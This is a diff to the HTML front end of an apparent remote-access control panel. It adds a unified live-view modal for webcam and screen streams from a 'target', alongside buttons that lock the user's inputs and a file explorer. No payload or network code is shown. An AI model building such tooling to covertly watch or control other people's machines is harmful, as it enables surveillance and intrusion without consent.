@@ -152,10 +152,10 @@
                                 <div>
                                     <h3 class="text-[10px] font-bold text-cyberBlue uppercase mb-2 tracking-wider pl-1 border-b border-gray-800 pb-1">Live Control</h3>
                                     <div class="grid grid-cols-2 gap-2">
-                                        <button onclick="openCamViewer()" class="bg-[#1a2235] hover:bg-cyberBlue/10 border border-gray-700 hover:border-cyberBlue p-2 rounded text-center transition-colors group">
+                                        <button onclick="startStream('webcam')" class="bg-[#1a2235] hover:bg-cyberBlue/10 border border-gray-700 hover:border-cyberBlue p-2 rounded text-center transition-colors group">
                                             <i class="fa-solid fa-camera text-gray-400 group-hover:text-cyberBlue mb-1"></i><h4 class="text-[10px] text-gray-200">Live Cam</h4>
                                         </button>
-                                        <button onclick="openScreenViewer()" class="bg-[#1a2235] hover:bg-cyberBlue/10 border border-gray-700 hover:border-cyberBlue p-2 rounded text-center transition-colors group">
+                                        <button onclick="startStream('screen')" class="bg-[#1a2235] hover:bg-cyberBlue/10 border border-gray-700 hover:border-cyberBlue p-2 rounded text-center transition-colors group">
                                             <i class="fa-solid fa-desktop text-gray-400 group-hover:text-cyberBlue mb-1"></i><h4 class="text-[10px] text-gray-200">Screen</h4>
                                         </button>
                                         <button onclick="termLog('User inputs locked.')" class="bg-[#1a2235] hover:bg-cyberBlue/10 border border-gray-700 hover:border-cyberBlue p-2 rounded text-center transition-colors group">
@@ -193,6 +193,26 @@
         </div>
     </main>
 
+    <!-- Live View Modal (NEW) -->
+    <div id="liveViewModal" class="hidden fixed inset-0 z-[100] bg-black/50 flex items-center justify-center p-4">
+        <div class="glass-panel w-full max-w-6xl h-[90vh] rounded-2xl border border-gray-700 flex flex-col glow-border relative overflow-hidden shadow-[0_0_50px_rgba(0,0,0,0.8)]">
+            <div class="p-4 border-b border-gray-800 flex justify-between items-center bg-[#0f1423] rounded-t-2xl flex-shrink-0">
+                <div class="flex items-center gap-4">
+                    <h2 class="font-bold text-lg text-white" id="liveViewTitle"></h2>
+                    <div id="monitorControls" class="flex items-center gap-2"></div>
+                </div>
+                <button onclick="closeLiveView()" class="w-8 h-8 rounded-full bg-gray-800 hover:bg-neon text-white flex items-center justify-center transition-colors"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="flex-grow bg-black flex items-center justify-center overflow-hidden p-2 rounded-b-2xl">
+                <img id="liveViewImage" src="" alt="Live feed" class="max-w-full max-h-full object-contain">
+                <div id="liveViewSpinner" class="text-center">
+                     <i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-4xl"></i>
+                     <p class="text-gray-400 font-mono mt-4">Awaiting first frame from target...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- File Explorer Modal -->
     <div id="fileExplorerModal" class="hidden fixed inset-0 z-[100] bg-black/50 flex items-center justify-center p-4">
         <div class="glass-panel w-full max-w-6xl h-[90vh] rounded-2xl border border-gray-700 flex flex-col glow-border relative overflow-hidden shadow-[0_0_50px_rgba(0,0,0,0.8)]">
@@ -208,30 +228,6 @@
             </div>
             <div class="flex-grow overflow-y-auto bg-[#0f1423]/80">
                 <table class="w-full text-sm text-left"><thead class="sticky top-0 bg-[#050810] z-10 border-b border-gray-700"><tr class="text-gray-400 font-mono text-xs uppercase"><th class="p-3 w-12"></th><th class="p-3">Name</th><th class="p-3 w-32 text-right">Size</th><th class="p-3 w-48 text-right">Date Modified</th><th class="p-3 w-24 text-center">Actions</th></tr></thead><tbody id="fsTbody" class="font-mono text-gray-300"></tbody></table>
-            </div>
-        </div>
-    </div>
-
-    <!-- Screen Viewer Modal -->
-    <div id="screenViewerModal" class="hidden fixed inset-0 z-[100] bg-black/50 flex items-center justify-center p-4">
-        <div class="glass-panel w-full max-w-6xl h-[90vh] rounded-2xl border border-gray-700 flex flex-col glow-border relative overflow-hidden shadow-[0_0_50px_rgba(0,0,0,0.8)]">
-            <div class="p-4 border-b border-gray-800 flex justify-between items-center bg-[#0f1423] rounded-t-2xl flex-shrink-0">
-                <h2 class="font-bold text-lg text-white"><i class="fa-solid fa-desktop text-cyberBlue mr-3"></i>Live Screen Feed: <span class="font-mono text-neon" id="sv-active-node"></span></h2>
-                <button onclick="closeScreenViewer()" class="w-8 h-8 rounded-full bg-gray-800 hover:bg-neon text-white flex items-center justify-center transition-colors"><i class="fa-solid fa-xmark"></i></button>
-            </div>
-            <div class="p-2 border-b border-gray-800 flex items-center gap-2 flex-shrink-0 bg-[#050810]">
-                <button onclick="startScreenFeed()" id="sv-start-btn" class="px-4 py-2 bg-green-500/20 text-green-400 hover:bg-green-500 hover:text-white border border-green-500 rounded text-xs font-bold transition-all"><i class="fa-solid fa-play mr-2"></i>Start Feed</button>
-                <button onclick="stopScreenFeed()" id="sv-stop-btn" class="px-4 py-2 bg-red-500/20 text-red-400 hover:bg-red-500 hover:text-white border border-red-500 rounded text-xs font-bold transition-all"><i class="fa-solid fa-stop mr-2"></i>Stop Feed</button>
-                <select id="sv-monitor-select" class="ml-auto bg-[#0B0F19] border border-gray-700 rounded text-xs p-2 focus:border-cyberBlue focus:outline-none">
-                    <option value="0">Monitor 1</option>
-                    <option value="1">Monitor 2</option>
-                    <option value="2">Monitor 3</option>
-                </select>
-                <span id="sv-status" class="text-xs font-mono text-gray-500 ml-4">STATUS: IDLE</span>
-            </div>
-            <div class="flex-grow overflow-hidden bg-black flex items-center justify-center" id="sv-image-container">
-                <p id="sv-placeholder" class="text-gray-600 font-mono">Awaiting video stream...</p>
-                <img id="screenViewerImage" class="hidden w-full h-full object-contain" alt="Live Screen Feed">
             </div>
         </div>
     </div>
